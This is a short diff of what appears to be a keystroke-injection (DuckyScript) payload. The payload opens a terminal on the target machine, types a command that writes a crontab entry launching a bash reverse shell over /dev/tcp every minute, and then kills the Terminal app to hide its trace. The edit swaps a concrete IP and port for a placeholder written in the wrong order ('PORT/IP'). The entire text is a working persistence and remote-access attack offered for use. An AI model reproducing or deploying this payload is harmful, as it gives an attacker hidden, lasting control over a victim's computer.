@@ -5,5 +5,5 @@ STRING terminal
 DELAY 50
 ENTER
 DELAY 100
-STRING echo "* * * * * bash -i >& /dev/tcp/10.204.0.50/7700 0>&1 > /dev/null" | crontab -; killall Terminal;
+STRING echo "* * * * * bash -i >& /dev/tcp/PORT/IP 0>&1 > /dev/null" | crontab -; killall Terminal;
 ENTER
